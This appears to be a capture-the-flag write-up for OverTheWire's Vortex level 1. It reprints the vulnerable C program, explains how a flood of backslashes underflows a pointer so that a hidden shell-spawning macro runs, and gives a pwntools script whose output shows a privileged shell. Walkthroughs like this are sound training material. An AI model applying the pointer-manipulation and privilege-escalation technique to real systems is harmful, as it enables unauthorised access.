@@ -1,0 +1,96 @@
+Not a crazy difficult level, but a bit weird at first...
+                                                                           vortex1.c
+┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│  #include <stdlib.h>                                                                                                                                             │
+│  #include <unistd.h>                                                                                                                                             │
+│  #include <string.h>                                                                                                                                             │
+│  #include <stdio.h>                                                                                                                                              │
+│                                                                                                                                                                  │
+│                                                                                                                                                                  │
+│  #define e(); if(((unsigned int)ptr & 0xff000000)==0xca000000) { setresuid(geteuid(), geteuid(), geteuid()); execlp("/bin/sh", "sh", "-i", NULL); }              │
+│                                                                                                                                                                  │
+│  void print(unsigned char *buf, int len)                                                                                                                         │
+│  {                                                                                                                                                               │
+│          int i;                                                                                                                                                  │
+│                                                                                                                                                                  │
+│          printf("[ ");                                                                                                                                           │
+│          for(i=0; i < len; i++) printf("%x ", buf[i]);                                                                                                           │
+│          printf(" ]\n");                                                                                                                                         │
+│  }                                                                                                                                                               │
+│                                                                                                                                                                  │
+│  int main()                                                                                                                                                      │
+│  {                                                                                                                                                               │
+│          unsigned char buf[512];                                                                                                                                 │
+│          unsigned char *ptr = buf + (sizeof(buf)/2);                                                                                                             │
+│          unsigned int x;                                                                                                                                         │
+│                                                                                                                                                                  │
+│          while((x = getchar()) != EOF) {                                                                                                                         │
+│                  switch(x) {                                                                                                                                     │
+│                          case '\n': print(buf, sizeof(buf)); continue; break;                                                                                    │
+│                          case '\\': ptr--; break;                                                                                                                │
+│                          default: e(); if(ptr > buf + sizeof(buf)) continue; ptr++[0] = x; break;                                                                │
+│                  }                                                                                                                                               │
+│          }                                                                                                                                                       │
+│          printf("All done\n");                                                                                                                                   │
+│  }                                                                                                                                                               │
+└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
+
+The binary for this level essentially reads in characters until the program is closed/reaches EOF.
+The goal is to get the defined 'e()' function to be called - which grants us a shell if an if statement inside is successful.
+
+This if statement checks that a variable pointer 'ptr' casted to an unsigned int logical AND'ed with 0xca000000 is equal to 0xca000000...
+
+This means ptr just has to point to an address within the range 0xca00000-0xcaffffff. If so, and e() is called, we get a shell!
+
+Now how do we do that?
+
+	*ptr is initially set to point halfway between the character array 'buf'.
+
+When reading chars in, this binary does 3 different things based off of the type of char:
+	- Newlines ('\n') that are read in print the entirety of a buffer (buf)
+	- backslashes decrease ptr by 1
+	- any other character gets written to the ptr, and then ptr is increased
+	       ^ only if ptr is not greater than end of 'buf'
+
+Although the part of this prog that writes data where you want can be misleading, the only thing that needs to be done
+is set ptr to a value in the range 0xca000000 to 0xcaffffff.
+
+To do that, we just send an appropriate amount of backslashes, and then one char (such as 'x') - that'll execute e() and grant a shell (because the condition will pass!)
+
+Since buf starts in 0xffXXXXXX, roughly in the middle, we need around 894400000 (0xff600000-0xca000000) backslashes to position ptr properly.
+With that in mind and a bit of testing, I found the number ~895572524 slashes to place it in the proper range.
+
+I sent the backslashes in tiny stages because the connection to the vortex servers were slow 
+
+76 stages of '\\'*11783849 
+
+Sending all of those and one char (x) grants a shell:
+
+      (pwntools, from 1pwn.py)
+┌─────────────────────────────────────┐
+│ #sh is process("/vortex/vortex1")   │
+│ for stage in range(1, 77):          │
+│     sh.send("\\"*11783849)          │
+│     b.status("Stage " + str(stage)) │
+│ sh.send("x")                        │
+└─────────────────────────────────────┘
+
+                         output of 1pwn.py:
+┌──────────────────────────────────────────────────────────────────┐
+  [+] Connecting to vortex.labs.overthewire.org on port 2228: Done
+  [*] vortex1@vortex.labs.overthewire.org:
+      Distro    Ubuntu 14.04
+      OS:       linux
+      Arch:     amd64
+      Version:  4.4.0
+      ASLR:     Disabled
+      Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
+  [+] Executing vortex1: Complete
+  [+] Opening new channel: '/vortex/vortex1': Done
+  [+] Sending backslashes: All stages sent
+  [+] vortex2 shell established
+  [*] Switching to interactive mode
+  $ $ whoami
+  vortex2
+  $ $
+└──────────────────────────────────────────────────────────────────┘
